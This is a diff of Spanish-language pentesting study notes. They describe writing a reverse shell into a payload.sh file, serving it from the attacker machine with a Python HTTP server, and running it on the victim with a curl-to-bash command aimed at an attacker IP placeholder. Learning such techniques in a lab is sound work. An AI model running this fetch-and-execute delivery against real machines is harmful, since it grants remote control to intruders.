@@ -3,7 +3,7 @@
 
 - Vamos a crear un `payload.sh` con `nano`.
 - Vamos a escribir una reverse shell
-![[Pasted image 20241211185224.png]]
+![](../Imagenes/Pasted%20image%2020241211185224.png)
 ==Se usa .sh (Script de shell) porque son ampliamente compatibles con sistemas Unix y Linux==
 - Guardamos.
 - Ahora, como podemos compartir este archivo con la maquina victima?
@@ -12,14 +12,14 @@
 python3 -m http.server 80
 ```
 - Esto levanta una pagina por el puerto 80 que nos permitirá ingresar y descargar lo que subamos a esta pagina.
-![[Pasted image 20241211185936.png]]
+![](../Imagenes/Pasted%20image%2020241211185936.png)
 - Ingresamos la IP en el buscador de internet de la maquina victima y ya estaríamos viendo el archivo que creamos.
-![[Pasted image 20241211194226.png]]
+![](../Imagenes/Pasted%20image%2020241211194226.png)
 - Lo podemos descargar
 
 - También tenemos otra forma de como ejecutarlo usando la terminal de la maquina victima, y es con el siguiente comando:
 ```
-curl http://192.168.1.146/payload.sh | bash
+curl http://(IP_ATACANTE/payload.sh | bash
 ```
 - Ponemos la IP de la maquina atacante seguido del nombre del archivo.
 - Nos mantenemos en escucha desde la maquina atacante y ejecutamos el comando desde la maquina victima.
